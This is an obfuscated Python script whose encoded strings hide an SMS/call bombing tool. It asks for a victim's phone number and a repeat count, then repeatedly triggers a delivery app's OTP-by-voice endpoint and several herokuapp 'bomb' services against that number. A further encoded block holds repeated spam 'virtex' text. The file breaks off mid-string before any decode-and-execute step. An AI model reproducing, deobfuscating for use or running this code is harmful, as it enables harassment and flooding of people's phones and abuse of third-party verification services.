# Python code Encrypted By Anonymous
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKdHJ5OgoJaW1wb3J0IGNvbG9yYW1hCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgoJcHJpbnQoImNvbG9yYW1hIGlzIG5vdCBJbnN0YWxsZWQiKQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBjb2xvcmFtYSIpCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKCXByaW50KCJSZXF1ZXN0cyBpcyBub3QgSW5zdGFsbGVkIikKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpkZWYgY2hlY2tfaW50cigpOgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tb3RoZXJmdWNraW5nd2Vic2l0ZS5jb20iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwcmludCgiQWJlIENodXRpeWEgSW50ZXJuZXQgT24gS2FyLiBJbnRlcm5ldCBFcnJvciIpCiAgICAgICAgc3lzLmV4aXQoMikKZnJvbSBjb2xvcmFtYSBpbXBvcnQgIEZvcmUsU3R5bGUKUiA9IEZvcmUuUkVECkIgPSBGb3JlLkJMVUUKRyA9IEZvcmUuR1JFRU4KQyA9IEZvcmUuQ1lBTgpZICA9IEZvcmUuWUVMTE9XCk0gPSBGb3JlLk1BR0VOVEEKVyA9IEZvcmUuV0hJVEUKUkVEPSIkKHByaW50ZiAnXGVbMzFtJykiCkdSRUVOPSIkKHByaW50ZiAnXGVbMzJtJykiCk9SQU5HRT0iJChwcmludGYgJ1xlWzMzbScpIgpCTFVFPSIkKHByaW50ZiAnXGVbMzRtJykiCk1BR0VOVEE9IiQocHJpbnRmICdcZVszNW0nKSIKQ1lBTj0iJChwcmludGYgJ1xlWzM2bScpIgpXSElURT0iJChwcmludGYgJ1xlWzM3bScpIgpCTEFDSz0iJChwcmludGYgJ1xlWzMwbScpIgpsaWMgPSAiIiIKIyAgQ29weXJpZ2h0IDIwMjEgVER5bmFtb3MgPHRkeW5hbW9zQGxpbnV4PgojICAKIyAgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIyAgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKIyAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIyAgCiMgIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAojICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCiMgIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiMgIAojICBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQojICBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZQojICBGb3VuZGF0aW9uLCBJbmMuLCA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sawojICBNQSAwMjExMC0xMzAxLCBVU0EuCiMgaWYgWW91IEhhdmUgQW55IFByb2JsZW0gQ29udGFjdCBNZSBPbiBJbnN0YSBAa3Jpc2hfbmFfMjU2OAojIEdoYXppcHVyIFVwIEluZGlhIAojIE15IEluc3RhIEBLcmlzaF9uYV8yNTY4CiIiIgoKbG9nbyA9IGYiIiIKe1J94pWt4pSB4pSB4pWu4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWt4pSB4pSB4pSB4pWuIOKVreKUgeKUgeKUgeKVruKVreKVruKVseKVreKVruKVseKVseKVseKVseKVseKVseKVreKVrgp7Un3ilIPila3ila7ilIPilbHilbHilbHilbHilbHilbHilbHilbHilbHilIPila3ilIHila7ilIMg4pSD4pWt4pSB4pWu4pSj4pWv4pWw4pSz4pWv4pWw4pWu4pWx4pWx4pWx4pWx4pWx4pSD4pSDCntXfeKUg+KVsOKVr+KVsOKUs+KUgeKUgeKUs+KUgeKUgeKUs+KUgeKUgeKUq+KUg+KVseKVsOKVryDilIPilIPilbHilIPilKPila7ila3ilLvila7ila3ilYvilIHilIHilLPilIHilIHilKvilIPila3ila4Ke1d94pSD4pWt4pSB4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pSD4pWt4pSB4pWuIOKUg+KVsOKUgeKVr+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKUg+KVreKUgeKUq+KVsOKVr+KVrwp7R33ilIPilbDilIHila/ilIPila3ila7ilIPila3ila7ilIPilbDila/ilIPilbDilLvilIHilIMg4pSD4pWt4pSB4pWu4pSD4pSD4pWw4pWu4pSD4pWw4pSr4pWt4pWu4pSD4pWw4pSB4pSr4pWt4pWu4pWuCntHfeKVsOKUgeKUgeKUgeKUu+KVr+KVsOKUu+KVr+KVsOKUq+KVreKUgeKUu+KUgeKUgeKUgeKVryDilbDila/ilbHilbDila/ilbDilIHila/ilbDilIHilLvila/ilbDilLvilIHilIHilLvila/ilbDila8K4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pSD4pSDIHtDfUF1dGhvciA6IHtZfUJhYXBHIEtyaXNobmEge1l9UmFqcHV0CuKVseKVseKVseKVseKVseKVseKVseKVseKVseKVseKVsOKVryB7Q31Db2RlciAgOiB7WX1BbnNoIERhZHdhbCtISVJVCiAiIiIKZGVmIHNlbmQobnVtYmVyLCB0aW1lcyk6CglpbXBvcnQgcmVxdWVzdHMKCXVybCA9ICJodHRwczovL2FwaS56ZXB0by5jby5pbi9hcGkvdjEvdXNlci9jdXN0b21lci9zZW5kLW90cC1pdnIvIgoKCWhlYWQgPSB7J0hvc3QnOiAnYXBpLnplcHRvLmNvLmluJywgJ2FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uJywgJ2FjY2Vzcy1jb250cm9sLWFsbG93LWNyZWRlbnRpYWxzJzogJ3RydWUnLCAneC1yZXF1ZXN0ZWQtd2l0aCc6ICdYTUxIdHRwUmVxdWVzdCcsICdyZXF1ZXN0aWQnOiAnMDA2YjlhZWQtMjNjNi00NjQwLWJiNTctNjYwNzBiMjU4Mjg2JywgJ3Nlc3Npb25pZCc6ICd1bmRlZmluZWQnLCAnYXBwdmVyc2lvbic6ICc1LjEyLjEnLCAncGxhdGZvcm0nOiAnYW5kcm9pZCcsICdzeXN0ZW12ZXJzaW9uJzogJzEwJywgJ3NvdXJjZSc6ICdQTEFZX1NUT1JFJywgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywgJ2NvbnRlbnQtbGVuZ3RoJzogJzI5JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwJywgJ3VzZXItYWdlbnQnOiAnb2todHRwLzMuMTIuMTInfQoKCWRhdGEgPSd7Im1vYmlsZU51bWJlciI6JytmJyJ7bnVtYmVyfSInKyd9JwoKCWltcG9ydCB0aW1lCglmb3IgaWkgaW4gcmFuZ2UgKDEsIHRpbWVzKToKCQlyZXNwPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkLCBkYXRhPWRhdGEpCgkJdGltZS5zbGVlcCgzKQoKCQlwcmludChzdHIoaWkpKyIgIityZXNwLnRleHQpCgpvcy5zeXN0ZW0oJ2NsZWFyJykKZGVmIHNtcygpOgoJY2hlY2tfaW50cigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50KFN0eWxlLkJSSUdIVCtsb2dvKQoJcHJpbnQoRykKCW51bWJlcj1pbnB1dChmIntHfVt7V30re0d9XSBFbnRlciB0aGUgVmljdGltJ3MgUGhvbmUgbnVtYmVyIFxuXG57V30tLS0tLXtSfSMge0N9IikKCXByaW50KCkKCWNyYXNoPWludChpbnB1dChmJ3tHfVt7V30re0d9XSBIb3cgTWFueSB0aW1lcyBkbyB5b3Ugd2FudCB0byBTZW5kIFt7V30xe0d9XSBCZXR0ZXJcblxue1J9Pj4+e0d9ICcpKQoJbGluazMgPSBmImh0dHBzOi8vbmV3eHhscjg1Lmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbmsyID0gZiJodHRwczovL25ld3h4bHI4MS5oZXJva3VhcHAuY29tL2JvbWIvODg4OCIKCWxpbmszID0gZiJodHRwczovL2JhYXBnLWF0dGFja29sZDIuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazQgPSBmImh0dHBzOi8vbmV3eHhscjgyLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbms1ID0gZiJodHRwczovL2JhYXBnLWNhbGwyLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbms2ID0gZiJodHRwczovL2JhYXBnLWF0dGFja29sZDIuaGVyb2t1YXBwLmNvbS9ib21iP251bWJlcj17bnVtYmVyfSIKCWxpbms3ID0gZiJodHRwczovL2JhYXBnLWNhbGwyLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCW'
love = 'kcozf4VQ0tMvWbqUEjpmbiY2WuLKOaYJ9fMP5bMKWin3IupUNhL29gY2WioJVir251oJWypa0vPtyfnJ5eBFN9VTLvnUE0pUZ6Yl9vLJSjMl1ioTDhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmRjVQ0tMvWbqUEjpmbiY25yq3u4oUV4AF5bMKWin3IupUNhL29gY2WioJVir251oJWypa0vPtyfnJ5eZGRtCFOzVzu0qUOmBv8iLzSupTpgLKE0LJAeo2kxZv5bMKWin3IupUNhL29gY2WioJVir251oJWypa0vPtyfnJ5eZGVtCFOzVzu0qUOmBv8iozI3rUufpwtlYzuypz9eqJSjpP5wo20iLz9gLv84BQt4VtbWoTyhnmVtCFOzVzu0qUOmBv8iLzSupTpgL2SfoQVhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmVtCFOzVzu0qUOmBv8iozI3rUufpwtmYzuypz9eqJSjpP5wo20iLz9gLv97oaIgLzIlsFVXPJkcozfkZPN9VTLvnUE0pUZ6Yl9hMKq4rTklBQHhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmVtCFOzVzu0qUOmBv8iLzSupTpgL2SfoQVhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmZtCFOzVzu0qUOmBv8iozI3rUufpwt2Yzuypz9eqJSjpP5wo20iLz9gLv97oaIgLzIlsFVXPJkcozf0VQ0tMvWbqUEjpmbiY25yq3u4oUV4ZF5bMKWin3IupUNhL29gY2WioJVir251oJWypa0vPtyfnJ5eAFN9VTLvnUE0pUZ6Yl9hMKq4rTklBQVhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmRkVQ0tMvWbqUEjpmbiY25yq3u4oUV4Zl5bMKWin3IupUNhL29gY2WioJVir251oJWypa0vPtyfnJ5eZvN9VTLvnUE0pUZ6Yl9vLJSjMl1ioTDhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWoTyhnmZtCFOzVzu0qUOmBv8iLzSupTpgLKE0LJAeo2kxZv5bMKWin3IupUNhL29gY2WioJV/oaIgLzIlCKghqJ1vMKW9VtbWoTyhnmVtCFOzVzu0qUOmBv8iLzSupTpgL2SfoQVhnTIlo2g1LKOjYzAioF9vo21vY3ghqJ1vMKW9VtbWMz9lVTxtnJ4tpzShM2HtXTAlLKAbXGbXPDyjpzyhqPtcPtxWpUWcoaDbMvW7JK1o4clGKFOGMJ5xnJ5aVR5iqlVcPtxWMz9lVTxtnJ4tpzShM2HbZFjkAFx6PtxWVPNtVPNtPKWypKIyp3EmYaOip3DbVzu0qUOmBv8iq3q3YzkiLJ5vLJWuYzAioF9mMTqjMJghnv9ADKOjH2IlqzywMF5up214Y1AyozECISOioxAuoTjvYTEuqTR9rlWjnT9hMH5iVwczVaghqJ1vMKW9Va0cPtxWVPNtVPNtPKWypKIyp3EmYaOip3DbVzu0qUOmBv8iLKI0nP5gLJqcL3Ocov5cov9GMJ5xG3EjDayQLJkfYlVfVTuyLJEypaZ9rlWQo250MJ50YIE5pTHvBvWupUOfnJAuqTyiov94YKq3ql1zo3WgYKIloTIhL29xMJD7VTAbLKWmMKD9IIETYGtvYPWOL2AypUDvBvViVvjvJP1FMKS1MKA0MJDgI2y0nPV6VyuAGRu0qUOFMKS1MKA0Va0fVTEuqTR9rlWjnT9hMI9holV6VwxkVvghqJ1vMKVfVaAgp19mMKW2nJAyK2MfLJpvBvVjVvjvLKOjYKMypaAco24gozSgMFV6VwRhAQLhZlVfVzSjpP12MKWmnJ9hVwbvBGV1Va0cPtxWVPNtVPNtPKWypKIyp3EmYaOip3DbVzu0qUOmBv8iLKI0nP5gLJqcL3Ocov5cov9GMJ5xG3EjY1LlYlVfVTuyLJEypaZ9rlWQo250MJ50YIE5pTHvBvWupUOfnJAuqTyiov94YKq3ql1zo3WgYKIloTIhL29xMJD7VTAbLKWmMKD9IIETYGtvYPWOL2AypUDvBvViVvjvJP1FMKS1MKA0MJDgI2y0nPV6VyuAGRu0qUOFMKS1MKA0Va0fVTEuqTR9rlWjnT9hMI9holV6VwxkVvghqJ1vMKVfVaAgp19mMKW2nJAyK2MfLJpvBvVjVvjvLKOjYKMypaAco24gozSgMFV6VwRhAQLhZlVfVzSjpP12MKWmnJ9hVwbvBGV1Va0cPDxtVPNtVPNWPtxWpzIkqJImqUZhM2I0XTkcozflXDbWPKWypKIyp3EmYzqyqPufnJ5eZlxXPDylMKS1MKA0pl5aMKDboTyhnmDcPtxWpzIkqJImqUZhM2I0XTkcozf1XDbWPKWypKIyp3EmYzqyqPufnJ5eAvxXPDylMKS1MKA0pl5aMKDboTyhnmpcPtxWpzIkqJImqUZhM2I0XTkcozf4XDbWPKWypKIyp3EmYzqyqPufnJ5eBFxXPDylMKS1MKA0pl5aMKDboTyhnmRjXDbWPKWypKIyp3EmYzqyqPufnJ5eZGRcPtxWpzIkqJImqUZhM2I0XTkcozfkZvxXPDycoKOipaDtK3EbpzIuMNbWPI90nUWyLJDhp3EupaEsozI3K3EbpzIuMPumMJ5xYPtvZGVmAQH2Amt5ZPVfZGNjXFxXPDyjpzyhqPuzVagUsFOGqJAwMKAmVCPsxL0vXDbWPDxWPtylMKZbXDcxMJLtq3Ovo21vXPx6PtywnTIwn19coaElXPxXPJ9mYaA5p3EyoFtaL2kyLKVaXDbWpUWcoaDboT9aolxXPKOlnJ50XRpcPtyhqJ1vMKV9nJ5jqKDbMvW7E31or1q9X3gUsI0tr0q9EJ50MKVtIzywqTygW3ZtHTuiozHtoaIgLzIlVUqcqTttL291oaElrFOQo2EyKT5poagFsG4+CagUsFNvXDbWpUWcoaDbXDbWL3Wup2t9nJ50XTyhpUI0XTLar0q9J3gKsFg7E31qVRIhqTIlVUEbMFOhqJ1vMKVto2LtL3Wup2uyplO7D30bGJS4VQRjZQNjXFOpoykhr0q9CG4tWlxcPtyfnJ5eVQ0tXTLvVvW4MTpgo3OyovObqUEjpmbiY3quYz1yY3ghqJ1vMKW9Ym90MKu0CHWuLKOUWGVjFzScWGVjFTyhMPITZPH5EvH5ZvIOZlHlZRqbLKccpUIlWGVjIKNyZwOWozEcLFITZPH5EvH5ZvIOZlHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHjDFITZPH5EvH5BPH4BRMioTkiqlHlZR1yWGVjG24yZwOWoaA0LFHlZPH0ZTglnKAbK25uKmV1AwtyEwNyBHLyDGDyDGZyZRRyEwNyBHLyBGDyDGIVDIxyZwORIHEOWGVjGxyYDHtyZwOMIHfyZwOOI09YI09YWGVjWHLjWGyTWGx4WGt4WGOOXzu0qUOmWGAOWGWTWGWTrJ91qUHhLzHyZxL0Hl1cZQp4YIyMEFbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5'
god = 'OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSpWSVJURVglMjBCVUFUQU4lMjBNUiUyMFZJUlVTJTIwQlVLQU4lMjBLQUxFTkclQzIlQjIqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJUYwJTlGJTkzJThDQlklRTIlODAlQTJNUiVFMiU4MCVBMlZVUlVTLVNQTSVGMCU5RiU5MiVBMyUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCp